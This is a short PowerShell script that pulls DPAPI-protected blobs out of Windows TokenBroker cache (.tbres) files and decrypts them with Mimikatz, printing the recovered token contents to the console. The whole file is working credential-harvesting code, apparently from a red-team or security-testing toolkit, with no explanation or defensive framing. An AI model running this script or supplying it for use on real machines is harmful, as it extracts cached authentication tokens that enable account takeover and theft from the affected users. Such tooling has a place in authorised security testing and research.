# ===== CONFIG =====
$tbresPath = "$env:APPDATA\Local\Microsoft\TokenBroker\Cache"
$outPath = ".\SecurityTooling\tbres_blobs"
$mimi = ".\SecurityTooling\mimikatz\x64\mimikatz.exe"

# ===== EXTRACTION =====
Write-Host "=== Extracting TBRES DPAPI blobs ==="
New-Item -ItemType Directory -Force -Path $outPath | Out-Null
Get-ChildItem $tbresPath -Filter "*.tbres" -File | ForEach-Object {
    Write-Host "Processing $($_.Name)"
    $raw = Get-Content $_.FullName -Raw -Encoding Unicode
    $matches = [regex]::Matches(
        $raw,
        '"Type"\s*:\s*"InlineBytes"\s*,\s*"IsProtected"\s*:\s*true\s*,\s*"Value"\s*:\s*"([^"]+)"'
    )
    $i = 0
    foreach ($m in $matches) {
        $i++

        $b64 = $m.Groups[1].Value
        $bin = [Convert]::FromBase64String($b64)
        $blobFile = Join-Path $outPath "$($_.BaseName)_$i.bin"
        [IO.File]::WriteAllBytes($blobFile, $bin)
        Write-Host "  → extracted blob $i"
    }
}

# ===== DECRYPTION =====
Write-Host "=== Decrypting blobs with Mimikatz (DPAPI::blob) ==="
Get-ChildItem $outPath -Filter *.bin | ForEach-Object {
    Write-Host "Decrypting $($_.Name)"
    $mimiOutput = & $mimi `
        "dpapi::blob /in:`"$($_.FullName)`" /unprotect" `
        "exit"
    $match = [regex]::Matches(
        ($mimiOutput -join "`n"),
        '(?s)data:\s*(.*)\s*mimikatz\(commandline\)',
        'IgnoreCase'
    )
    $binary_decoded = $match.Groups[1].Value
    $data = (
        $binary_decoded -replace '\s', '' -split '(..)' |
        Where-Object { $_ } |
        ForEach-Object { [char][byte]("0x$_") }
    ) -join ''
    Write-Host "Decoded content:"
    Write-Host $data
    Write-Host "-------------------------------------"
}